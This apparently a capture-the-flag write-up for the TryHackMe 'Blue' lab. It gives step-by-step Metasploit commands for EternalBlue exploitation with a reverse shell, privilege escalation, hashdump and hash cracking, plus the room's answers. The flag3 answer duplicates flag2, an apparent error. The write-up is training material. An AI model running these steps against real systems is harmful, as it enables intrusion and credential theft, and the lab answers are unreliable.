
# TryHackMe - Blue Machine Documentation

## Introduction
This guide provides a comprehensive walkthrough for the **Blue** machine on TryHackMe. It covers enumeration, vulnerability identification, exploitation via EternalBlue (MS17-010), privilege escalation, password cracking, and flag capture.

## Prerequisites
Before starting, ensure you have:
- An account on [TryHackMe](https://tryhackme.com/)
- A machine with **Kali Linux** or **Parrot Security** (VM in **VirtualBox** or **VMware**)
- A stable internet connection
- OpenVPN installed to connect to TryHackMe VPN

### Required Tools:
`nmap`, `metasploit`, `john`, `rockyou.txt`

---

## Repository Structure

```
tryhackme-blue/
├── README.md			# Introduction and overview
├── Blue.md			# Main documentation (full guide)
└── Screenshots/		# Visual references
    ├── Screenshot-01.png
    ├── Screenshot-02.png
    ├── ...
    └── Screenshot-34.png
```

---

## Task 1: Recon

**The first step is to establish a secure connection with the TryHackMe platform using OpenVPN.**
   - You can follow this guide [VPN Secure Guide](https://github.com/fartaviao/tryhackme-tutorial) for detailed documentation and step-by-step process to connect your machine to TryHackMe VPN.
   - In this case we are doing the [Blue Room](https://tryhackme.com/room/blue) machine, therefore make sure to join the room and start the machine to see the target IP. 
   - This is the first step to gain access to the target machine, ensure you have completed before continue.
   
**For be more organized we can follow the following structure ~/Downloads/TryHackMe/Blue**
 - In my case I will continue using the Downloads folder.
   ```bash
   cd Downloads/TryHackMe
   mkdir Blue
   ls
   cd Blue
   ```
- Answer the questions below:

**1. Scan the machine.**
- No answer needed ✅ Correct Answer

**2. How many ports are open with a port number under 1000?**

Perform a full port scan to identify services, to find open ports we use `nmap` with the following flags:
```bash
sudo nmap -sV -sC --script vuln <TARGET_IP>
```
What it does:
- `-sV` Detects service versions on open ports.
- `-sC` Runs default NSE (Nmap Scripting Engine) scripts for general info gathering.
(Useful for basic reconnaissance, such as:
`banner`
`http-title`
`ssh-hostkey`
`ssl-cert`
`default auth checks`
… and others)
- `--script vuln` Executes all vulnerability-related NSE scripts to detect known CVEs and misconfigurations.
(These scripts try to identify known vulnerabilities based on the detected services. They can check for things like:
. Specific CVEs
. Misconfigurations
. Insecure versions
. Known vulnerabilities in services like `HTTP`, `SMB`, `FTP`, `SSH`, etc.
. Very useful for quick vulnerability assessments, but it may generate suspicious traffic and trigger IDS/IPS alerts.

![Scan for open ports, services, versions and known vulnerabilities](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-01.png)

- 3 ✅ Correct Answer

**3. What is this machine vulnerable to?**
- `ms17-010` ✅ Correct Answer

---

## Task 2: Gain Access

- Exploit the machine and gain a foothold.

- Answer the questions below:

**1. Start Metasploit.**
```bash
msfconsole
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-02.png)

- No answer needed ✅ Correct Answer

**2. Find the exploitation code we will run against the machine. What is the full path of the code?**
Since we already know the vulnerability (ms17-010), we can search for related exploits:
```bash
search ms17-010 type:exploit
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-03.png)

- exploit/windows/smb/ms17_010_eternalblue ✅ Correct Answer

**3. Show options and set the one required value. What is the name of this value? (All caps for submission)**
We'll use the first one listed (exploit #0, EternalBlue). To load it:
```bash
use 0
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-04.png)

Since we don't have any payload loaded yet, we can view which ones are available:
```bash
show payloads
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-05.png)

In this case, considering that we want to gain access to the machine and knowing that it is a Windows x64 system, we will use the payload number 60.
(payload windows/x64/shell/reverse_tcp | Windows x64 Command Shell, Reverse TCP Inline)
To load it:
```bash
set payload windows/x64/shell/reverse_tcp
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-06.png)

Once the payload is set, display the exploit options:
```bash
show options
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-07.png)

- RHOSTS ✅ Correct Answer

**4. Run the exploit!**
Before running the exploit, we need to set the **RHOSTS** value to the IP address of the target machine:
```bash
set rhosts <TARGET_IP>
```

![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-08.png)
(The target IP changed because in my case for this write-up the machine timed out, but it doesn't matter just keep it in mind)

We must also configure LHOST with the IP address of our local VPN adapter. You can find your IP by running `ip a`:
```bash
set lhost <YOUR_TUN0_VPN_IP>
```
Once everything is configured, execute the exploit:
```bash
run
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-09.png)

- No answer needed ✅ Correct Answer

**5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**

![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-10.png)

- No answer needed ✅ Correct Answer

---

## Task 3: Escalate

- Escalate privileges, learn how to upgrade shells in metasploit.

- Answer the questions below:

**1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**
We previously background the session with (CTRL + Z). If we want to check the active sessions, we simply run the following command:
```bash
sessions -l
```
Now we have to research how to convert a shell to meterpreter shell in metasploit.

![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-11.png)

We find this [Web Site](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646). Following the steps, we can convert the normal shell to a meterpreter shell:
```bash
search shell_to_meterpreter
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-12.png)

- post/multi/manage/shell_to_meterpreter ✅ Correct Answer

**2. Select this (use MODULE_PATH). Show options, what option are we required to change?**
To select a module you can interact by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter:
```bash
use 0
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-13.png)

Now let's take a look to the module `options`. To do that use the command:
```bash
show options
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-14.png)

If we look at the options, there is an unassigned requirement:

- SESSION ✅ Correct Answer

**3. Set the required option, you may need to list all of the sessions to find your target here.**
First we need to specify the session. Run `sessions -l` again to list the active sessions."
```bash
sessions -l
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-15.png)

We must assign session number 1 to the module. To do this, we use `set session 1`.
```bash
set session 1
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-16.png)

- No answer needed ✅ Correct Answer

**4. Run! If this doesn't work, try completing the exploit from the previous task once more.**
Once we have completed all the configurations we can `run` the meterpreter shell:
```bash
run
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-17.png)

- No answer needed ✅ Correct Answer

**5. Once the meterpreter shell conversion completes, select that session for use.**
If we list the `sessions -l` again we can see that a new session have been created:
```bash
sessions -l
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-18.png)

To select this new session (meterpreter shell) we have to view the `Id` and run `sessions -i 2`
```bash
sessions -i 2
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-19.png)

We can see the sistem information with:
```bash
sysinfo
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-20.png)

- No answer needed ✅ Correct Answer

**6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run `getsystem` to confirm this. Feel free to open a dos shell via the command `shell` and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.**

We run `getsystem` to confirm the privilege scalation and then open a DOS shell using the command `shell`.
Next step is run `whoami` to see who are you in the system.
```bash
getsystem
shell
whoami
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-21.png)

- No answer needed ✅ Correct Answer

**7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).**
```
exit
ps
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-22.png)

- No answer needed ✅ Correct Answer

**1. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.**

We are going to migrate to the process marked with the `PID 660` in this case. To do this, we use:
```bash
migrate 660
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-23.png)

- No answer needed ✅ Correct Answer

---

## Task 4: Cracking

- Dump the non-default user's password and crack it!

- Answer the questions below:

**1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**

Let's run `hashdump` in the meterpreter shell:
```bash
hashdump
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-24.png)

- Jon ✅ Correct Answer

**2. Copy this password hash to a file and research how to crack it. What is the cracked password?**

Let's copy the hashed password into a `hashedpassword.txt`:
```bash
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hashedpassword.txt
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-25.png)

We are going to use `John The Ripper` to crack the password with the file `rockyou.txt`:
```bash
sudo john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashedpassword.txt
```
If you get an error, it's because the file can't be found, as it is compressed. You can decompress it with `gzip`:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```
Now we can run `John The Ripper` again:
```bash
sudo john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashedpassword.txt
```
Cracked password!

![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-26.png)

- alqfna22 ✅ Correct Answer

---

## Task 5: Find Flags! 🚩

- Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

- Answer the questions below:

**1. Flag1? This flag can be found at the system root.**

To find the flag, we’ll first check which directory we’re in using `pwd`:
```
pwd
cd ..
cd ..
```
Now we are in the root directory C:\

Run the commando `dir` to list the directory content:
```
dir
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-27.png)
We can see the `flag1.txt`, run `cat` to see the contect:
```bash
cat flag1.txt
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-28.png)

- flag{access_the_machine} ✅ Correct Answer

**2. Flag2? This flag can be found at the location where passwords are stored within Windows.**

- Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

Windows passwords are stored in hash format inside files located in the directory `C:\Windows\System32\Config` We change to that directory and run `dir` again.
```
cd C:/Windows/System32/config
dir
```
We cat see the `flag2.txt` soo we `cat` it to see the content:
```
cat flag2.txt
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-29.png)

We have the second flag.

- flag{sam_database_elevated_access} ✅ Correct Answer

**3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**

Given the hint that administrators usually store interesting things, we’re going to check the user directories. For that, we’ll go to the users directory. First, we check which directory we’re in using `pwd`. We should be in `C:\`, since this is where the \Users directory is located. Then we use `dir` to list the users:
```
pwd
cd ..
cd ..
cd ..
cd C:\Users
dir
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-30.png)

We are going to look in the Jon's directory:
```
cd Jon
dir
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-31.png)

To locate flag3.txt within all subdirectories under `C:\Users\Jon` during a Meterpreter session, use the `search` command, which allows recursive file searches.
```
search -f flag3.txt
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-32.png)

We cat see the `flag3.txt` soo we `cat` it to see the content:
```
cd Documents
cat flag3.txt
```
![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-33.png)

We have the third flag.

- flag{sam_database_elevated_access} ✅ Correct Answer

---

## 🎉 Congratulations! Room Completed! 🎉

You’ve successfully completed the **Blue** room on TryHackMe. You performed:

- Network reconnaissance
- Vulnerability scanning
- Exploitation with Metasploit
- Privilege escalation
- Password cracking
- Flag discovery and enumeration

![Metasploit](https://raw.githubusercontent.com/fartaviao/tryhackme-blue/refs/heads/main/Screenshots/Screenshot-34.png)

---

## Conclusion and Additional Resources

### Summary

We successfully:
- Scanned and enumerated SMB services
- Identified the EternalBlue (MS17-010) vulnerability
- Exploited the machine using Metasploit
- Gained a reverse shell and captured the flag

### Resources

- [TryHackMe Room - Blue](https://tryhackme.com/room/blue)
- [MS17-010 CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [EternalBlue Exploit Research](https://www.rapid7.com/blog/post/2017/05/15/ms17-010-eternalblue-vulnerability/)
- [Metasploit Framework](https://docs.rapid7.com/metasploit/)

---

## Author
Created by **Fausto Artavia Ocampo** for educational purposes and practical cybersecurity training.

Happy hacking! 💀

---

